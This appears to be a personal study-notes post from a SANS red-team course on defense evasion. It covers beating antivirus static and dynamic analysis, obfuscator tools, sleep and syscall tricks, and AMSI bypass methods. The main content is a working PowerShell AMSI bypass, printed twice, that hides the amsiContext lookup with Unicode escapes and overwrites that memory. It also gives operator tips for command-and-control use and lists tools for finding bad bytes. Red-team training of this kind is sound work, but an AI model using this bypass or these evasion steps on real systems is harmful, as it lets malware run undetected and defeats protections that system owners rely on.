---
title: Defense Evasion
date: 2026-01-03 00:00:00 +0000
categories: [Sans Red-Team 2025 Lessons]
tags: [sans, red-team, 2025]
---


**Effectiveness of defenses vary depending on the language of your payload, Powershell, VBA and C# will trigger AMSI**

**You will NOT deal with AMSI unless you leverage the CLR (.NET)** 

### Write malware in C, nim, REST, Go

Go is hard to RE, it's obfuscatd by default

# Static Analysis

Easiest defense to bypass is static
Basically just a bunch of regex, beat the regex = beat the static analysis
Sometimes replacing one word is enough
- Mimikatz replaced to mimidogz
- String reverse is also effective
- Changing encoding schemes

Static analysis can be bypassed through source code obfuscation
This can be done manually or using "obfuscators"
Depending on the language of your payload
- Powershell (chameleon, invoke-obfuscation)
- C# (obfuscar, confuserex, rofuscator, Invisibility Cloak)
- C/C++ (LLVM)
- Go (garble)

Manual is longer but better

# Dynamic Analysis

Is a complex problem as every security vendor 
- Uses their own algos
- Prioritizes certain behaviors
- Publishes different insight

**Dynamic analysis inspects the code at runtime**

## Dynamic Analysis Downsides

Takes significant resources away form other processes
Usually doesn't monitor a process continuously, but
- Sporadically scan
- Scan at start of the process

Most advanced products do not monitor the entire process, they focus on hooking suspicious API calls


# Dynamic Analisys Bypass

- Sleeping for 15 sec prior to executing malicious code
- Using encryption to mask program functions
- Use API calls that do the same thing, but are not monitored (VirtualAlloc/VirtualAllocX)
- Using low level code that has the same functionality as the API call (syscalls) - not even using API calls just ASM doing the same thing

**Cobalt's beacon while sleeping is encypted**


# Antimalware Scan Interface (AMSI)

- Dynamic Analisys + Static Signituring
- Present in processes that leverage the .NET framework
- Also integrated with the Office suite
- A DLL that is injected into new processes
- Lives in the process so prone to manipulation


# AMSI Bypass

- Prevent the scanning function by nullifiying the buffer
- Prevent AMSI from being loaded successfully via amsiContext (won't work in Win11)
- Bypass by downgrading to PowerShell 2.0
- Certain encodings
- Hooking into the AmsiScanBuffer function
- Patching memory
- https://amsi.fail/


# Custom AMSI Bypass 

Bypass involves overriding the *amsiContext* mkaing AMSI unable to function properly

Locate amsiContext

• Static analysis is the likely mechanism
• Test this hypothesis
• Use Unicode characters using built-in PowerShell functionality

```
PS C:\> [Ref].Assembly.GetType('System.Management.Aut
omation.'+[regex]::Unescape('\u0041')+'msiUtils').Get
Field("ams"+[regex]::Unescape('\u0069')+"Context",
'NonPublic,Static').GetValue($null)
```

AMSI Under the Hood
Now that we have the memory location of the amsiContext field, we can take a look through a debugger's eyes to
see what that field looks like in memory.
If we attach WinDbg ( a popular debugger for Windows) to the PowerShell process and decompile the memory
location, we identify that amsiContext in an unaltered state begins with AMSI followed by some "junk"
characters. Interesting.

# Creating the AMSI Bypass

Let's create our bypass:
1. First, we are going to create a new byte array that contains the
sentence "sec565 rules!!!" in hexadecimal representation
2. We will use the Count function to dynamically compute the size
of the array
3. Finally, we will copy the byte array to the amsiContext
location, overriding what is currently there

Creating the AMSI Bypass
1. First, we are going to create a new byte array that contains the sentence "sec565 rules!!!" in hexadecimal
representation.
2. After that, we will use the Count function to dynamically compute the size of the array.
3. Finally, we will copy the byte array to the amsiContext location, overriding what is currently there.
If everything goes as planned, AMSI will error out, making it unable to scan whatever triggered AMSI in the first
place. This would lead to effectively bypassing AMSI, allowing us to execute arbitrary (malicious) content.

### AMSI Bypass Code

```
# create the byte array
$sec565 = [Byte[]]
(0x73,0x65,0x63,0x35,0x36,0x35,0x20,0x72,0x75,0x6c,0x65,0x73,0x21,0x21,0
x21)
# calculate the length of the array dynamically
$length = $sec565.Count
# get the memory location of amsiContext
[IntPtr]$ptr = [Ref].Assembly.GetType('System.Management.Automation.'+[r
egex]::Unescape('\u0041')+'msiUtils')
.GetField("ams"+[regex]::Unescape('\u0069')+"Context",'NonPublic,Static'
).GetValue($null)
# echo it, so we can inspect it in a debugger if we want
echo $ptr
# copy the array to the memory location
[System.Runtime.InteropServices.Marshal]::Copy($sec565,0,$ptr,$length)
```

```
AMSI Bypass Code
We create the byte array, and will find the length for our call to copy later on.
Once we get the memory address, we print it to standard out.
Finally, we copy our byte array to where amsiContext is in memory.
# create the byte array
$sec565 = [Byte[]]
(0x73,0x65,0x63,0x35,0x36,0x35,0x20,0x72,0x75,0x6c,0x65,0x73,0x21,0x21,0x21)
# calculate the length of the array dynamically
$length = $sec565.Count
# get the memory location of amsiContext
[IntPtr]$ptr = [Ref].Assembly.GetType('System.Management.Automation.'+[regex
]::Unescape('\u0041')+'msiUtils')
.GetField("ams"+[regex]::Unescape('\u0069')+"Context",'NonPublic,Static').Ge
tValue($null)
# echo it, so we can inspect it in a debugger if we want
echo $ptr
# copy the array to the memory location
[System.Runtime.InteropServices.Marshal]::Copy($sec565,0,$ptr,$length)
```

# AMSI Bypass in Action

Let's restart PowerShell and apply the patch, then inspect what it
looks like now under a debugger

```
PS C:\> amsiscanbuffer
At line:1 char:1
+ amsiscanbuffer
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
+ CategoryInfo
: ParserError: (:) [], ParentContainsErrorRecordException
+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

If we now restart PowerShell and apply the patch and attach WinDbg again, we will see our "sec565 rules!!!"
sentence where 'AMSI' used to be in the amsiContext field. By replacing the AMSI string with our own custom
string, we effectively broke AMSI's functionality, which allows us to do whatever we want without having to
worry about AMSI.
Important:
• AMSI is now patched for this process, and this process only.
• This is not a global AMSI patch!
• What this means is, if you spawn a new process (for example, another PowerShell.exe process), AMSI will
still be applied to that new process and will not be patched.
• This is important to understand when you are operating from a command-and-control framework, as some
tasks might spawn a new process. This will get you burned if you did not patch AMSI for that newly spawned
process.

### AMSI Bypass Tools

Tools can aid you in creating bypasses by identifying the bad bytes
• DefenderCheck
• ThreatCheck
• AMSITrigger